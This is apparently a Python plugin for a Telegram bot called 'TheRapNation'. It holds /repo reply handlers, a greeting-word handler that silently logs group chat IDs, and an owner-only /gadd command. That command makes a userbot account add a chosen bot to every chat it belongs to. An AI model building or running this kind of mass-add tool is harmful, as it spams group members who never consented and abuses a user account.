from pyrogram import Client, filters
import requests
import random
import os
import re
import asyncio
import time
from TheRapNation import app
from TheRapNation.utils.database import add_served_chat_clone, delete_served_chat_clone
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from TheRapNation.utils.database import get_assistant
import asyncio
from TheRapNation.misc import SUDOERS
from TheRapNation.mongo.afkdb import LOGGERS as OWNERS
from TheRapNation.core.userbot import Userbot
from pyrogram import Client, filters
from pyrogram.errors import UserAlreadyParticipant
from TheRapNation import app
import asyncio
import random
from pyrogram import Client, filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import (
    ChatAdminRequired,
    InviteRequestSent,
    UserAlreadyParticipant,
    UserNotParticipant,
)
from TheRapNation import app
from TheRapNation.utils.branded_ban import admin_filter
from TheRapNation.utils.decorators.userbotjoin import UserbotWrapper
from TheRapNation.utils.database import get_assistant, is_active_chat


@Client.on_message(filters.command("repo") & filters.group)
async def repo(client: Client, message: Message):
    await message.reply_photo(
        photo=f"https://i.pinimg.com/736x/1b/3b/9c/1b3b9c21929feb288b293d294935695f.jpg",
        caption=f"""🍁𝐂𝐋𝐈𝐂𝐊🥰""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🌱 𝐒𝐎𝐔𝐑𝐂𝐄 🌱", url=f"https://t.me/the_rap_nation"
                    )
                ]
            ]
        ),
    )


@Client.on_message(filters.command("repo") & filters.group)
async def help(client: Client, message: Message):

    await message.reply_photo(
        photo=f"https://i.pinimg.com/736x/1b/3b/9c/1b3b9c21929feb288b293d294935695f.jpg",
        caption=f"""🍁𝐂𝐋𝐈𝐂𝐊🥰""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🌱 𝐒𝐎𝐔𝐑𝐂𝐄 🌱", url=f"https://t.me/the_rap_nation"
                    )
                ]
            ]
        ),
    )


@Client.on_message(filters.command("repo") & filters.private)
async def help(client: Client, message: Message):
    await message.reply_photo(
         photo=f"https://i.pinimg.com/736x/1b/3b/9c/1b3b9c21929feb288b293d294935695f.jpg",
        caption=f"""🍁𝐂𝐋𝐈𝐂𝐊🥰""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🌱 𝐒𝐎𝐔𝐑𝐂𝐄 🌱", url=f"https://t.me/the_rap_nation"
                    )
                ]
            ]
        ),
    )


# --------------------------------------------------------------------------------- #


@Client.on_message(
    filters.command(
        ["hi", "hii", "hello", "hui", "good", "gm", "ok", "bye", "welcome", "thanks"],
        prefixes=["/", "!", "%", ",", "", ".", "@", "#"],
    )
    & filters.group
)
async def bot_check(_, message):
    chat_id = message.chat.id
    await add_served_chat_clone(chat_id)


# --------------------------------------------------------------------------------- #


import asyncio
import time


@Client.on_message(filters.command("gadd") & filters.user(int(OWNERS)))
async def add_all(client, message):
    command_parts = message.text.split(" ")
    if len(command_parts) != 2:
        await message.reply(
            "**⚠️ ɪɴᴠᴀʟɪᴅ ᴄᴏᴍᴍᴀɴᴅ ғᴏʀᴍᴀᴛ. ᴘʟᴇᴀsᴇ ᴜsᴇ ʟɪᴋᴇ » `/gadd `**"
        )
        return

    bot_username = command_parts[1]
    try:
        userbot = await get_assistant(message.chat.id)
        bot = await client.get_users(bot_username)
        app_id = bot.id
        done = 0
        failed = 0
        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")

        async for dialog in userbot.get_dialogs():
            if dialog.chat.id == -1002198719573:
                continue
            try:
                await userbot.add_chat_members(dialog.chat.id, app_id)
                done += 1
                await lol.edit(
                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
                )
            except Exception as e:
                failed += 1
                await lol.edit(
                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{userbot.username}"
                )
            await asyncio.sleep(3)  # Adjust sleep time based on rate limits

        await lol.edit(
            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
        )
    except Exception as e:
        await message.reply(f"Error: {str(e)}")
